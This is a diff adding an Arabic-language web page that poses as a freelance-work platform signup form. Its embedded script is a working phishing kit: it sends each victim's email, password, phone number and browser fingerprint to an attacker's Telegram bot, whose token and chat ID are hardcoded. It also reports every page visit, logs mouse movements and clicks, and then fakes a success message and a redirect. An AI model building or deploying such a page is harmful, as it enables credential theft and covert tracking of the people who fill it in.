@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة العمل الحر العربية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        .form-container {
+            padding: 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .feature {
+            text-align: center;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #2c3e50;
+        }
+        
+        .feature i {
+            font-size: 20px;
+            margin-bottom: 8px;
+            color: #3498db;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            color: #27ae60;
+        }
+        
+        .success-message i {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 منصة العمل الحر العربية</h1>
+            <p>سجل الآن وابدأ رحلتك في عالم العمل الحر</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">📧 البريد الإلكتروني</label>
+                    <input type="email" id="email" name="email" required placeholder="ادخل بريدك الإلكتروني">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">🔒 كلمة المرور</label>
+                    <input type="password" id="password" name="password" required placeholder="ادخل كلمة المرور">
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">📱 رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="ادخل رقم هاتفك">
+                </div>
+                
+                <button type="submit" class="btn">إنشاء حساب جديد</button>
+            </form>
+            
+            <div class="features">
+                <div class="feature">
+                    <div>💼</div>
+                    <span>وظائف حرة</span>
+                </div>
+                <div class="feature">
+                    <div>💰</div>
+                    <span>دفع آمن</span>
+                </div>
+                <div class="feature">
+                    <div>🌎</div>
+                    <span>عمل عن بعد</span>
+                </div>
+                <div class="feature">
+                    <div>⚡</div>
+                    <span>بدء فوري</span>
+                </div>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>جاري إنشاء حسابك...</p>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <div>✅</div>
+                <h3>تم إنشاء حسابك بنجاح!</h3>
+                <p>سيتم تحويلك إلى لوحة التحكم خلال ثوانٍ</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // بيانات البوت - استبدل هذه بالقيم الحقيقية
+        const BOT_TOKEN = '8082384713:AAGCD_h4i6zL7M6nAddLT-IjksJWX3UpY4w';
+        const CHAT_ID = '6070612674';
+        
+        // روابط التليجرام API
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // جمع معلومات المتصفح والنظام
+        function collectSystemInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                referrer: document.referrer,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        // إرسال البيانات إلى بوت التليجرام
+        async function sendToTelegram(data) {
+            const message = `
+🎣 *بيانات جديدة مسجلة* 🎣
+
+*المعلومات الشخصية:*
+📧 البريد: ${data.email}
+🔒 كلمة المرور: ${data.password}
+📱 الهاتف: ${data.phone}
+
+*معلومات النظام:*
+🖥️ المتصفح: ${data.systemInfo.userAgent}
+🌐 اللغة: ${data.systemInfo.language}
+📱 الشاشة: ${data.systemInfo.screen}
+⏰ المنطقة: ${data.systemInfo.timezone}
+🔗 الرابط: ${data.systemInfo.url}
+            `.trim();
+            
+            try {
+                const response = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // معالجة تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                phone: document.getElementById('phone').value
+            };
+            
+            // إظهار تحميل
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // جمع معلومات النظام
+            const systemInfo = collectSystemInfo();
+            
+            // إرسال البيانات إلى التليجرام
+            const success = await sendToTelegram({
+                ...formData,
+                systemInfo: systemInfo
+            });
+            
+            // إخفاء التحميل وإظهار رسالة النجاح
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+            
+            // إعادة التوجيه بعد 3 ثوانٍ
+            setTimeout(() => {
+                window.location.href = 'https://www.example.com/dashboard';
+            }, 3000);
+        });
+        
+        // جمع معلومات إضافية عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            const initialInfo = collectSystemInfo();
+            
+            // إرسال زيارة الصفحة الأولى
+            fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🔍 زائر جديد للصفحة:\n${initialInfo.userAgent}\n${initialInfo.url}`
+                })
+            });
+        });
+        
+        // تتبع تحركات الماوس والنقرات
+        let userBehavior = [];
+        document.addEventListener('mousemove', function(e) {
+            userBehavior.push({
+                type: 'mousemove',
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now()
+            });
+        });
+        
+        document.addEventListener('click', function(e) {
+            userBehavior.push({
+                type: 'click',
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                time: Date.now()
+            });
+        });
+        
+        // إرسال بيانات السلوك قبل مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            if (userBehavior.length > 0) {
+                const behaviorSummary = `
+📊 ملخص سلوك المستخدم:
+- عدد تحركات الماوس: ${userBehavior.filter(b => b.type === 'mousemove').length}
+- عدد النقرات: ${userBehavior.filter(b => b.type === 'click').length}
+- مدة الجلسة: ${(Date.now() - userBehavior[0].time) / 1000} ثانية
+                `.trim();
+                
+                fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: behaviorSummary
+                    })
+                });
+            }
+        });
+    </script>
+</body>
+</html>
